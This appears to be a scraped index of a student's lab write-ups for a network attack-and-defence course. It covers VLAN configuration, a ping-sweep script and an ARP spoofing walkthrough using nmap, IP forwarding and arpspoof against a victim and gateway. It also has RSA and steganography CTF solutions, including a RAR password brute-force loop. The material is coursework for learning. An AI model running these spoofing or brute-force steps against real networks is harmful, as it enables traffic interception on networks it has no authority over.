Fa0/17, Fa0/18, Fa0/19, Fa0/20 Fa0/21, Fa0/22, Fa0/23, Fa0/24 Gig0/1, Gig0/2 10 green active 20 yellow active ... ::: :::spoiler Switch相對應的Interface\nSwitch#configure Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Switch(config)#int f0/1 Switch(config-if)#switchport access vlan 10 Switch(config-if)#int f0/2 Switch(config-if)#switchport access vlan 10 Switch(config-if)#int f0/3 Switch(config-if)#switchport access vlan 20 Switch(config-if)#int f0/4 Switch(config-if)#switchport access vlan 20 Switch(config-if)#^Z Switch# %SYS-5-CONFIG_I: Configured from console by console Switch#show vlan VLAN Name Status Ports ---- -------------------------------- --------- ------------------------------- 1 default active Fa0/5, Fa0/6, Fa0/7, Fa0/8 Fa0/9, Fa0/10, Fa0/11, Fa0/12 Fa0/13, Fa0/14, Fa0/15, Fa0/16 Fa0/17, Fa0/18, Fa0/19, Fa0/20 Fa0/21, Fa0/22, Fa0/23, Fa0/24 Gig0/1, Gig0/2 10 green active Fa0/1, Fa0/2 20 yellow active Fa0/3, Fa0/4 可以看到一開始設定的VLAN只有active，現在設定了對應的Interface後，就會加到對應的VLAN Tag(u一開始一定要先確定好哪個interface接到哪一台device) :::\nSetting Inter-VLAN Routing # :::spoiler 各個PC 設定Default Gateway(如果要送封包出去，要從哪個大們出去) ::: :::spoiler Router 設定 Router 子介面 – 802.1q IP\nRouter\u0026gt;enable Router#configure Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Router(config)#int g0/0/0.1 Router(config-subif)#encapsulation dot1Q 10 Router(config-subif)#ip addr 10.1.1.100 255.255.255.0 Router(config-subif)#int g0/0/0.2 Router(config-subif)#encapsulation dot1Q 20 Router(config-subif)#ip addr 10.2.2.100 255.255.255.0 Router(config-subif)#^Z Router# %SYS-5-CONFIG_I: Configured from console by console Router#configure Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Router(config)#interface GigabitEthernet0/0/0 Router(config-if)#no sh 設定靜態路由\nRouter#configure Configuring from terminal, memory, or network [terminal]? Enter configuration commands, one per line. End with CNTL/Z. Router(config)#ip route 10.1.1.0 255.255.255.0 g0/0/0.1 %Default route without gateway, if not a point-to-point interface, may impact performance Router(config)#ip route 10.2.2.0 255.255.255.0 g0/0/0.2 %Default route without gateway, if not a point-to-point interface, may impact performance ::: :::spoiler Switch Switch 連接 Router 改為 Trunk mode 注意：是要修改與Router連接的介面 :::\n:::spoiler Result 最後的結果 :::\n"},{"id":13,"href":"/security/course/ntu-padns/ad-of-network-security---lab-3/","title":"A\u0026D of Network Security - Lab 3","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 3 # tags: Practicum of A\u0026amp;D of NS NTU # Background # Network setting type in virtual box Ping two machine in internal mode # :::spoiler Detailed Process\nClone another VM Setting Network Configuration Setting 2 VMs\u0026rsquo; network config as above. Note that, must check MAC address is different, promiscuous mode is Allow All and the adapter is the same.\nCheck ifconfig Ping each other :::\nTest Communication between bridged VMs on Different Hosts # :::spoiler Detailed Process\nSetting Bridged Adapter of each VM Note that, the adapter must be the same.\nCheck ifconfig It should be the same of sub-ip as your true machine Ping :::\nReconstruct ARP cache by iteratively PING all subnet IP addresses # Objective: scanning all the machine in the same LAN\nNote # DO NOT EXECUTE IN DORM\u0026hellip; YOU\u0026rsquo;LL BE BANNED\u0026hellip;\nSource Code # #!/bin/bash # ping all ip addresses in the local network for ip in 192.168.0.{1..254}; do # delete old arp records sudo arp -d $ip \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 # get new arp info by ping ping -c 5 $ip \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp; done # wait for all ping processes to finish wait # show scan results (arp table) arp -n | grep -v incomplete Detailed Process # :::spoiler Detailed Process\nSetting to Host-Only Adapter Check ifconfig It should be the same as your real machine Setting the code\n$ sudo dos2unix arpscan.sh $ sudo chmod 777 arpscan.sh $ vim arpscan.sh # modify the sub-ip as the same as your real machine, i.e. 192.168.56.{1..254} $ sudo bash arpscan.sh :::\nTesting Communication between VMs on Different Hosts using NAT # Objective: Find another physical computer and open web service on each PC then use port forwarding to connect the web service to each other.\n:::spoiler Detailed Process\nFind another physical computer and connect your own network\nSet to NAT mode Check your physical computer and VM\u0026rsquo;s ip Turn off VM and set port forwarding Open your web service\n$ sudo service apache2 start Then test if the service is open or not in local host Start to let somebody else to query your service OR\u0026hellip; You can edit the content of index.html and the result is as below.\n$ cd /var/www/html $ sudo rm index.html $ sudo touch index.html $ sudo vim index.html # Just write `It works on VM1!!!` and saved it :::\n"},{"id":14,"href":"/security/course/ntu-padns/ad-of-network-security---lab-4arp--dns-spoofing/","title":"A\u0026D of Network Security - Lab 4(ARP \u0026 DNS SPOOFING)","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 4(ARP \u0026amp; DNS SPOOFING) # tags: Practicum of A\u0026amp;D of NS NTU # Background # ARP Spoofing at 1:15:00\nARP SPOOFING # Setting 2 VMs\u0026rsquo; network interface as Bridged adapter :::danger You supposed to use your own network instead of public network :::\nChecking IP And check the victim gateway by nmap\n$ sudo nmap -sP 192.168.43.0/24 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 10:46 EDT Nmap scan report for DESKTOP-D0UCTM3 (192.168.43.56) Host is up (0.00020s latency). MAC Address: 68:54:5A:DC:03:57 (Intel Corporate) Nmap scan report for 192.168.43.66 Host is up (0.010s latency). MAC Address: D4:38:9C:87:2F:C6 (Sony) Nmap scan report for kali (192.168.43.222) Host is up (0.00040s latency). MAC Address: 08:00:27:B1:9D:67 (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.43.78 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 6.13 seconds :::info Victim VM $\\to$ 192.168.43.222 / MAC $\\to$ 08:00:27:F7:12:7A Attacker VM $\\to$ 192.168.43.78 / MAC $\\to$ 08:00:27:B1:9D:67 Default Gateway $\\to$ 192.168.43.66 :::\nOpen NAT Port Forwarding\nIn Attacker VM $ sudo su $ echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward $ exit $ cat /proc/sys/net/ipv4/ip_forward 1 In Victim VM $ arp -a ? (192.168.43.78) at 08:00:27:f7:12:7a [ether] on eth0 DESKTOP-D0UCTM3 (192.168.43.56) at 68:54:5a:dc:03:57 [ether] on eth0 DESKTOP-D0UCTM3 (192.168.43.56) at 68:54:5a:dc:03:57 [ether] on eth0 Start to attack\n$ sudo arpspoof -i eth0 -t 192.168.43.222 192.168.43.66 // sudo arpspoof -i {網卡介面} -t {攻擊目標 IP} {Gateway IP} Result Problem \u0026amp; Solved # :::info If you can not install dsniff, you may update and upgrade the whole system with command sudo apt-get update; sudo apt-get upgrade(It may take lot\u0026rsquo;s of time to finish the work) :::\nDNS SPOOFING # "},{"id":15,"href":"/security/course/ntu-padns/ad-of-network-security---lab-7/","title":"A\u0026D of Network Security - Lab 7","section":"Securities","content":" A\u0026amp;D of Network Security - Lab 7 # tags: Practicum of A\u0026amp;D of NS NTU # Background # What is foremost and How to use it?\nRSA CTF # Exercise - RSA # Given\np = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Then I can use decrypt function to fetch plaintext. Flag(hex): 12058e43d9e0c22559c19774 :::spoiler source code\nfrom Crypto.Util.number import long_to_bytes, inverse, bytes_to_long p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483 q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407 e = 65537 c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 n = p * q phi = (q-1)*(p-1) d = inverse(e, phi) print(long_to_bytes(pow(c,d,n)).hex()) :::\nExercise - Decrypt_RSA # Given public-key.pem and flag.txt File: public-key.pem\n-----BEGIN PUBLIC KEY----- MGwwDQYJKoZIhvcNAQEBBQADWwAwWAJRAK5btPJmADJZz5pvUhw8A0EBds8W31OV NHbq47Ie3mw8ewO9yiCzHABn/6eX5OkQWXhz7vETpg/szZXetbK/EAZr4iJKzinV MtwLWnTS0AbxAgMBAAE= -----END PUBLIC KEY----- Recon Obviously, you can notice that public key file is generated by such like openssl tool. So, there\u0026rsquo;s a way to turn it to text. Transform $ openssl rsa -pubin -in public-key.pem -text RSA Public-Key: (640 bit) Modulus: 00:ae:5b:b4:f2:66:00:32:59:cf:9a:6f:52:1c:3c: 03:41:01:76:cf:16:df:53:95:34:76:ea:e3:b2:1e: de:6c:3c:7b:03:bd:ca:20:b3:1c:00:67:ff:a7:97: e4:e9:10:59:78:73:ee:f1:13:a6:0f:ec:cd:95:de: b5:b2:bf:10:06:6b:e2:22:4a:ce:29:d5:32:dc:0b: 5a:74:d2:d0:06:f1 Exponent: 65537 (0x10001) writing RSA key -----BEGIN PUBLIC KEY----- MGwwDQYJKoZIhvcNAQEBBQADWwAwWAJRAK5btPJmADJZz5pvUhw8A0EBds8W31OV NHbq47Ie3mw8ewO9yiCzHABn/6eX5OkQWXhz7vETpg/szZXetbK/EAZr4iJKzinV MtwLWnTS0AbxAgMBAAE= -----END PUBLIC KEY----- Then after the transformation, you can see that n=p*q=0x00ae... and e=65537\nHex to Decimal\n\u0026gt;\u0026gt;\u0026gt; int(\u0026#34;00ae5bb4f266003259cf9a6f521c3c03410176cf16df53953476eae3b21ede6c3c7b03bdca20b31c0067ffa797e4e910597873eef113a60feccd95deb5b2bf10066be2224ace29d532dc0b5a74d2d006f1\u0026#34;, 16) 3107418240490043721350750035888567930037346022842727545720161948823206440518081504556346829671723286782437916272838033415471073108501919548529007337724822783525742386454014691736602477652346609 Factoring Small n Just using the online tool and you\u0026rsquo;ll get p and q p=1634733645809253848443133883865090859841783670033092312181110852389333100104508151212118167511579 q=1900871281664822113126851573935413975471896789968515493666638539088027103802104498957191261465571\nDecrypt Cipher\nfrom Crypto.Util.number import long_to_bytes, inverse, bytes_to_long, isPrime from base64 import b64decode cipher = open(\u0026#34;./flag.txt\u0026#34;, \u0026#34;rb\u0026#34;).read().hex() cipher = int(cipher, 16) p = 1634733645809253848443133883865090859841783670033092312181110852389333100104508151212118167511579 q = 1900871281664822113126851573935413975471896789968515493666638539088027103802104498957191261465571 e = 65537 n = p * q phi = (q-1)*(p-1) d = inverse(e, phi) print(bytes.fromhex(long_to_bytes(pow(cipher,d,n)).hex()).decode(\u0026#34;cp437\u0026#34;)) Flag: FLAG_IS_WeAK_rSA\nStego CTF # Exercise 1 - zip Extension # Use binwalk to Recon $ binwalk Exercise\\ 1\\ -\\ example.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, EXIF standard 12 0xC TIFF image data, big-endian, offset of first image directory: 8 9298 0x2452 TIFF image data, little-endian offset of first image directory: 662 9692 0x25DC JPEG image data, JFIF standard 1.01 14241 0x37A1 Copyright string: \u0026#34;Copyright 2003 Apple Computer Inc., all rights reserved.\u0026#34; 1972141 0x1E17AD Zip archive data, at least v1.0 to extract, compressed size: 20, uncompressed size: 20, name: secret.txt 1972309 0x1E1855 End of Zip archive, footer length: 22 You can see that it contained a zip file at the end of data Change Extension Thus, you can change the extension manually and unzip it Get Secret :::spoiler secret flag supa_secret_flagzor ::: Exercise 2 - Foremost # Recon $ pngcheck Exercise\\ 2\\ -\\ PurpleThing.png Exercise 2 - PurpleThing.png EOF while reading CRC value ERROR: Exercise 2 - PurpleThing.png $ binwalk Exercise\\ 2\\ -\\ PurpleThing.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 3200 x 2953, 8-bit/color RGBA, non-interlaced 85 0x55 Zlib compressed data, best compression 2757 0xAC5 Zlib compressed data, best compression 765455 0xBAE0F JPEG image data, JFIF standard 1.01 765485 0xBAE2D TIFF image data, big-endian, offset of first image directory: 8 1809691 0x1B9D1B StuffIt Deluxe Segment (data): f First, I used pngcheck to observe the data structure and it returned CRC error means something wrong at the end of file. Therefore, I used binwalk to check the extra information. It seemed has another file in it. Use Foremost to parse hiding files $ foremost -v Exercise\\ 2\\ -\\ PurpleThing.png Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus Audit File Foremost started at Mon Apr 10 22:47:57 2023 Invocation: foremost -v Exercise 2 - PurpleThing.png Output directory: /mnt/d/NTU/First Year/2nd semester/Practicum of Attacking and Defense of Network Security/Lab/Lec07/Practice/output Configuration file: /etc/foremost.conf Processing: Exercise 2 - PurpleThing.png |------------------------------------------------------------------ File: Exercise 2 - PurpleThing.png Start: Mon Apr 10 22:47:57 2023 Length: 2 MB (2354256 bytes) Num Name (bs=512) Size File Offset Comment 0: 00001495.jpg 1 MB 765455 *| Finish: Mon Apr 10 22:47:57 2023 1 FILES EXTRACTED jpg:= 1 ------------------------------------------------------------------ Foremost finished at Mon Apr 10 22:47:57 2023 Then it\u0026rsquo;ll extract a folder named output :::spoiler secret flag ::: Exercise 3 - Unzip twice # Use binwalk to recon $ binwalk Exercise\\ 3\\ -\\ stego2.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 40804 0x9F64 Zip archive data, at least v2.0 to extract, compressed size: 32993, uncompressed size: 33783, name: got2.jpg 73941 0x120D5 End of Zip archive, footer length: 22 Unzip it binwalk again $ binwalk got2.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 33587 0x8333 Zip archive data, at least v1.0 to extract, compressed size: 32, uncompressed size: 32, name: txt.txt 33761 0x83E1 End of Zip archive, footer length: 22 Unzip it again Get flag :::spoiler Flag: 6307834008eb8edbe18c7a20ee4a909d ::: Exercise 4 # Recon\n$ pngcheck -cv Exercise\\ 4\\ -\\ stego1.png File: Exercise 4 - stego1.png (11037 bytes) chunk IHDR at offset 0x0000c, length 13 800 x 800 image, 24-bit RGB, non-interlaced chunk IDAT at offset 0x00025, length 10980 zlib: deflated, 32K window, default compression chunk IEND at offset 0x02b15, length 0 No errors detected in Exercise 4 - stego1.png (3 chunks, 99.4% compression). Seems there is nothing special information however, TA\u0026rsquo;s hint is png filter. Refer to W3C spec, I am aware that there are several filter types that can be applied, such as None (byte 0x0), Sub (byte 0x1), Up (byte 0x2) etc.\nBytes of these filter types can be used to hide information, i.e. the flag, in the PNG. In our case, we have to decompress the PNG IDAT chunk data and extract the filter type bytes from the decompressed data.\nDecompressed Flag by Using Script below\n./Exercise\\ 4-exp.py Exercise\\ 4\\ -\\ stego1.png PNG Signature: (b\u0026#39;\\x89\u0026#39;, b\u0026#39;P\u0026#39;, b\u0026#39;N\u0026#39;, b\u0026#39;G\u0026#39;, b\u0026#39;\\r\u0026#39;, b\u0026#39;\\n\u0026#39;, b\u0026#39;\\x1a\u0026#39;, b\u0026#39;\\n\u0026#39;) Pos : 8 Type: b\u0026#39;IHDR\u0026#39; Size: 13 CRC : b\u0026#39;5412913F\u0026#39; Pos : 33 Type: b\u0026#39;IDAT\u0026#39; Size: 10980 CRC : b\u0026#39;98F96EEB\u0026#39; Pos : 11025 Type: b\u0026#39;IEND\u0026#39; Size: 0 CRC : b\u0026#39;AE426082\u0026#39; Data length in PNG file : 10980 Decompressed data length: 1920800 Flag: DrgnS{WhenYouGazeIntoThePNGThePNGAlsoGazezIntoYou} :::spoiler source code\n#!/usr/bin/env python from struct import unpack from binascii import hexlify, unhexlify import sys, zlib # Returns [Position, Chunk Size, Chunk Type, Chunk Data, Chunk CRC] def getChunk(buf, pos): a = [] a.append(pos) size = unpack(\u0026#39;!I\u0026#39;, buf[pos:pos+4])[0] # Chunk Size a.append(buf[pos:pos+4]) # Chunk Type a.append(buf[pos+4:pos+8]) # Chunk Data a.append(buf[pos+8:pos+8+size]) # Chunk CRC a.append(buf[pos+8+size:pos+12+size]) return a def printChunk(buf, pos): print(\u0026#39;Pos : \u0026#39;+str(pos)+\u0026#39;\u0026#39;) print(\u0026#39;Type: \u0026#39; + str(buf[pos+4:pos+8])) size = unpack(\u0026#39;!I\u0026#39;, buf[pos:pos+4])[0] print(\u0026#39;Size: \u0026#39; + str(size)) #print(\u0026#39;Cont: \u0026#39; + str(hexlify(buf[pos+8:pos+8+size]))) print(\u0026#39;CRC : \u0026#39; + str(hexlify(buf[pos+size+8:pos+size+12]).upper())) print if len(sys.argv)!=2: print(\u0026#39;Usage: ./this Stegano_PNG\u0026#39;) sys.exit(2) with open(sys.argv[1], \u0026#39;rb\u0026#39;) as f: buf = f.read() pos=0 print(\u0026#34;PNG Signature: \u0026#34; + str(unpack(\u0026#39;cccccccc\u0026#39;, buf[pos:pos+8]))) pos+=8 chunks = [] for i in range(3): chunks.append(getChunk(buf, pos)) printChunk(buf, pos) pos+=unpack(\u0026#39;!I\u0026#39;,chunks[i][1])[0]+12 decompressed = zlib.decompress(chunks[1][3]) # Decompressed data length = height x (width * 3 + 1) print(\u0026#34;Data length in PNG file : \u0026#34;, len(chunks[1][3])) print(\u0026#34;Decompressed data length: \u0026#34;, len(decompressed)) height = unpack(\u0026#39;!I\u0026#39;,(chunks[0][3][4:8]))[0] width = unpack(\u0026#39;!I\u0026#39;,(chunks[0][3][:4]))[0] blocksize = width * 3 + 1 filterbits = \u0026#39;\u0026#39; for i in range(0,len(decompressed),blocksize): bit = unpack(\u0026#39;2401c\u0026#39;, decompressed[i:i+blocksize])[0] if bit == b\u0026#39;\\x00\u0026#39;: filterbits+=\u0026#39;0\u0026#39; elif bit == b\u0026#39;\\x01\u0026#39;: filterbits+=\u0026#39;1\u0026#39; else: print(\u0026#39;Bit is not 0 or 1... Default is 0 - MAGIC!\u0026#39;) sys.exit(3) s = filterbits endianess_filterbits = [filterbits[i:i+8][::-1] for i in range(0, len(filterbits), 8)] flag = \u0026#39;\u0026#39; for x in endianess_filterbits: if x==\u0026#39;00000000\u0026#39;: break flag += unhexlify(\u0026#39;%x\u0026#39; % int(\u0026#39;0b\u0026#39;+str(x), 2)).decode() print(\u0026#39;Flag: \u0026#39; + flag) :::\nExercise 5 - Change Palette # Recon First, I used online tool to fetch some info but all of them are useless. So, I used stegsolve.jar to analyze the figure, and something blurry appeared at the right of picture shown below Try to change palette I found a useful code on Stack Overflow, and after some debugging, I can use it successfully. This program is aimed to allow us to write out 256 images, each one highlighting a single entry in white while blacking out the others:\n$ for i in {0..255}; do ./change_palette.py doge_stege.png \u0026#34;single-color-${i}.png\u0026#34; \u0026#34;${i}\u0026#34;; done :::info At the first time using, you should uncomment line 32 and comment line 34 to find which page can be decrypted ::: You can observe that single-color-127.png has some strings that we met in stegsolve.jar, so that is the magic number that we can continue decrypting.\nContinue changing palette\n$ for i in {0..128}; do ./change_palette.py doge_stege.png \u0026#34;range-color-127+${i}.png\u0026#34; \u0026#34;${i}\u0026#34;; done :::info Note that you should uncomment line 34 and comment line 32 to decrypt it further. ::: You can notice that most of the results have clearly flag strings in the pictures. :::spoiler source code\n#!/usr/bin/env python import sys import struct from zlib import crc32 import os # PNG file format signature pngsig = b\u0026#39;\\x89PNG\\r\\n\\x1a\\n\u0026#39; def swap_palette(filename, n): # open in read+write mode with open(filename, \u0026#39;r+b\u0026#39;) as f: f.seek(0) # verify that we have a PNG file if f.read(len(pngsig)) != pngsig: raise RuntimeError(\u0026#39;not a png file!\u0026#39;) while True: chunkstr = f.read(8) if len(chunkstr) != 8: # end of file break # decode the chunk header length, chtype = struct.unpack(\u0026#39;\u0026gt;L4s\u0026#39;, chunkstr) # we only care about palette chunks if chtype == b\u0026#39;PLTE\u0026#39;: curpos = f.tell() paldata = f.read(length) # replace palette entry n with white, the rest with black # paldata = (\u0026#34;\\x00\\x00\\x00\u0026#34; * n) + \u0026#34;\\xff\\xff\\xff\u0026#34; + (\u0026#34;\\x00\\x00\\x00\u0026#34; * (256 - n - 1)) # replace palette entry 127 to 127 + n with white, the rest with black paldata = (b\u0026#34;\\x00\\x00\\x00\u0026#34; * 127) + (b\u0026#34;\\xff\\xff\\xff\u0026#34;*n) + (b\u0026#34;\\x00\\x00\\x00\u0026#34; * (256 - (127 + n))) # go back and write the modified palette in-place f.seek(curpos) f.write(paldata) f.write(struct.pack(\u0026#39;\u0026gt;L\u0026#39;, crc32(chtype+paldata)\u0026amp;0xffffffff)) else: # skip over non-palette chunks f.seek(length+4, os.SEEK_CUR) if __name__ == \u0026#39;__main__\u0026#39;: import shutil shutil.copyfile(sys.argv[1], sys.argv[2]) swap_palette(sys.argv[2], int(sys.argv[3])) :::\nExercise 6 # TA\u0026rsquo;s Hint: LSB and brute force\nFetch LSB from Each Pixel\nfrom PIL import Image FLAG = \u0026#34;\u0026#34; flag_image = Image.open(\u0026#34;./Exercise 6 - bonas.png\u0026#34;) pixel = flag_image.getdata() for i in pixel: FLAG += bin(i)[-1] Observe the data type After getting LSB from each pixel, you can observe the extension of this file from the beginning bytes\n... for i in range(4): print(chr(int(FLAG[i*8:(i+1)*8], 2))) ... The output is: Rar!\nTransform a proper file So, we can modify the file extension and store it in bytes.\n... output = open(\u0026#34;./data.rar\u0026#34;, \u0026#34;wb\u0026#34;) for j in range(0, len(FLAG), 8): output.write(chr(int(FLAG[j:j+8], 2)).encode()) ... Brute force to decrypt it However if we\u0026rsquo;d like to unzip it, it needs 5 char password. So, I found a wordlist in this page and try to unzip it.\n... import subprocess, re password = open(\u0026#34;password.txt\u0026#34;, \u0026#34;r\u0026#34;).read().split(\u0026#34; \u0026#34;) for passwd in password: # print(passwd) result = subprocess.getstatusoutput(\u0026#34;unrar x data.rar - inul -p\u0026#34; + passwd) if result[0] == 0: print(\u0026#34;Sucess!! Password is {}\u0026#34;.format(passwd)) break ... After Unzip it You\u0026rsquo;ll get a flag.txt and the flag is: LSB_is_ubiquitous\nReference # Exercise Decrypt_RSA # How do I use the openssl command to decode a public key .PEM file?\nExercise 4 # PNG (Portable Network Graphics) Specification CONFidence CTF Teaser A PNG Tale - Write Up Misc 总结 \u0026mdash;-隐写术之图片隐写(二）\nExercise 5 # Plaid CTF 2014: doge_stege doge_stege write up - 第8回資料 二進制處理方式\nExercise 6 # Multimedia - 정말 커다란 이미지가 있습니다. PIL Image.getdata() 教程\n"},{"id":16,"href":"/security/course/ntu-padns/ad-of-network-security-note/","title":"A\u0026D of Network Security Note","section":"Securities","content":" A\u0026amp;D of Network Security Note # tags: Practicum of A\u0026amp;D of NS NTU # Background # :::spoiler IP / 遮罩 / 閘道 三者的關係\n用日常生活中的例子來比喻，IP 就好比在社區中的門牌地址，如果是要找同社區(一樣遮罩範圍的)，就只要透過社區廣播喊一聲。如果找不到人，表示在社區外，就要出社區大門(閘道)去外面問\n所以遮罩設定錯誤，代表硬把兩個不同社區的給劃在一起，但是實際上遞送封包就會找不到 (明明住光復國宅結果你跟郵差說光復國宅跟孟竹國宅都在一區)\n閘道設定錯誤則是連大門都搞錯了，這樣蓮社區都出不去，自然網路也無法連線 :::\n:::spoiler [網路] 淺談 ARP (Address Resolution Protocol) 運作原理\n在乙太網路上，資料的傳遞必須要有實體位址 (MAC Address)，Layer 2 設備會驗證 Frame 的實體位址，不是找它的一律捨棄，但設備一開機總不可能就有所有設備的實體位址吧？所以就需要 ARP 協定來協助取得各個設備的實體位址\nARP 是利用乙太網路的廣播功能所設計出來的位址解析協定，它的主要特性是它的位址對應關係是動態的，以查詢的方式來獲得 I P位址 (IP Address) 和實體位址 (MAC Address / Physical Address) 的對應關係。\n只要是 Layer 3 的設備都一定會有 ARP Cache，並且會在 ARP 快取內建立 ARP 表格 (ARP Table) 用來記錄 IP 位址和實體位址的對應關係。這個 Table 會依據自身的存活時間遞減而消失，以確保資料的正確性。 簡單說明我的理解： Assume在同一內網中有三台主機：PC0, PC1, PC2 Objective：PC0要ping PC1 Obstacle：但目前PC0的ARP cache中沒有PC1的MAC Address，所以不知道要寄給誰(沒有門牌號碼) Solution：利用broadcast的方式向其他主機發送ARP Request的廣播封包，查詢目標主機的實體位址 Process：\n不是PC1的其他主機收到ARP Request的package就會直接丟掉，而PC1會將PC0的IP位址及MAC位址對應寫到ARP表格裡以及回傳一個ARP Reply封包給PC0 ARP Reply封包內包含Source MAC/IP及Target MAC/IP PC0收到ARP Reply後，將目標MAC Address填入ICMP(Ping)封包的L2表頭之後就開始執行Ping PC1的動作 ::: :::spoiler 搞懂ICMP協定及工具 抵擋「死亡之Ping」攻擊\nICMP是Internet Control Message Protocol的縮寫，這個網路協定運用在網路七層協定中的第三層。該協定的最主要目的，是用來解析網路封包或是分析路由的情況，大多是透過所傳回來的錯誤訊息進行分析，而網路管理人員則利用這個協定的工具來了解狀況，進而使用其他措施解決所遇到的問題\nICMP會使用TTL的概念，TTL的全名是Time To Live，其值代表還有多少「生存時間」，其實就是還可以被轉發處理多少次 每個路由器在轉發ICMP封包時，都會把IP Header的TTL的值減1，如果TTL的值已經到0，就代表TTL已經到期，接著就會傳送錯誤訊息給原本發送的網路設備 ::: :::spoiler Broadcast Storm 首先，當 PC A 發出了一個 L2 的廣播封包（像是之前介紹的 ARP 請求封包，就是廣播形式的） PC A 將會發送至 Switch 2（他也只有連上 Switch 2，也沒辦法傳給其他人） Switch 2 看到了這個封包，想說是廣播封包 所以複製了一份，傳給 Switch 1 與 Switch 3，這時候整個網路拓樸中就已經有兩份這個封包了，讓我們根據複製出來的封包做編號並分別講解\n這時候 Switch 1 收到了一個廣播包，因為只有連接 Switch 1 與 Switch 3，而這個封包是從 Switch 2 收到了，所以只會被轉傳給 Switch 3 Switch 3 也收到了一個廣播包，所以他決定複製一份，往其他實體網路接口傳送，也就是往 Switch 1 與 PC A\n發現了嗎，這時候複製出來的這兩個封包就會留存在網路拓樸中 且因為 Layer 2 沒有 TTL（Time to Live）機制，沒辦法轉送超過一定數量設備後被丟棄 所以網路內的封包就會越來越多，且電腦也會一直收到複製出來的廣播封包 這時候就會造成 Switch 與終端設備要花資源來處理這些垃圾封包 而最終將會造成資源耗盡 ::: :::spoiler Spanning Tree Protocol(STP)生成樹協定 實作方式：PVST+\n選舉Root Switch 選舉Root Port 選擇Designated Port與Nondesignated Port ::: :::spoiler What is Storage Area Network(SAN)\nSAN技術廣泛的運用在企業裡，用以提供高速的、可管理的、具容錯能力的、富彈性的儲存服務。譬如作為資料儲存、備份、系統備援等。SAN不是單一設備或是某種協定，它是一種服務架構，結合多種硬體(如：光纖、HBA卡、高速交換機、伺服器、磁碟陣列等)與軟體(管理軟體、initator與target軟體、驅動程式等)的技術。採用SAN的架構，可以將各個單一的儲存設備連結起來，提供整合性的管理與應用。SAN最大的用途不僅在於做為資料的儲存，而是在於其容錯與災難備援的能力。 優點有：\n儲存設備的分享，具有經濟效益。透過網路架構，所有的用戶端不必直接連接到特定的儲存設備上就可以使用期資源。 有效的管理。透過管理軟體，可以更有效的管理儲存的資料與制定備援計劃。 容錯能力，降低風險。SAN提供多種容錯功能，從最簡單的mirror到進階的snapshot，在在可以減低資料遺失或是企業服務中斷的風險。 我自己的解讀就是不同架構且比較高級的NAS，因為:\nTarget與Initator之間，透過高速的網路連結，這通常是光纖。而提供連接的介面我們稱之為HBA(Host Bus Adapter)，建構網路的方式則是光纖交換機。這些林林種種的設備，講求的是高速與穩定，但是相對的代表的就是高貴\nNAS VS SAN NAS使用基於文件的協議例如NFS或SMB/CIFS且是存取的電腦上的文件而不是硬碟。 而SAN是Client/Server架構，其中提供儲存能力的一端稱之為Target，而要求資源的一端稱為Initator，透過網路架構，所有的用戶端不必直接連接到特定的儲存設備上就可以使用期資源 ::: :::spoiler What is TUN \u0026amp; TAP\n在電腦網路中，TUN與TAP是作業系統核心中的虛擬網路裝置。不同於普通靠硬體網路配接器實現的裝置，這些虛擬的網路裝置全部用軟體實現，並向執行於作業系統上的軟體提供與硬體的網路裝置完全相同的功能。\nTAP等同於一個乙太網路裝置，它操作第二層封包如乙太網路資料框。TUN類比了網路層裝置，操作第三層封包比如IP資料封包。 :::\n:::spoiler ICMP協定功能\n根據我們的瞭解 IP 網路是一種不可靠的傳輸方式，傳送中的封包必須經過多層路由器的轉送才能到達目的地，因此，在發送封包之前，我們很難預測該封包是否可以安全到達目的地。我們也很迫切地想知道目前網路的狀況，尤其在傳送失敗時，更想瞭解問題出在什麼地方。TCP/IP 網路中提供一種稱之為『網際控制訊息協定』（Internet Control Message Protocol, ICMP）的通訊軟體，用來偵測網路的狀況。在 IP 網路上，任何一部主機或路由器皆設置有 ICMP 協定，它們之間就可以利用 ICMP 來互相交換網路目前的狀況訊息，例如，主機不存在、網路斷線等等狀況。ICMP 訊息的產生有下列兩種情況：\n障礙通知：當 IP 封包傳送當中，在某一網路上發生問題而無法繼續傳送，則會回應 ICMP 訊息給原封包傳送端。如圖 4-14 所示，訊號_1是由 Router_A 回應；或是由 Router_B 回應訊號_2；也有可能是由主機 B 回應訊號_3。 狀況查詢：可以發送 ICMP 來查詢目前網路的情況。如圖 4-15 中，主機 A 發送 ICMP 查詢訊息，有可能由路由器回應（訊號_1 和 訊號_2），或由主機 B 回應訊號_3。 :::\n02-ICMPv6 - 网络工程师俱乐部的视频 - 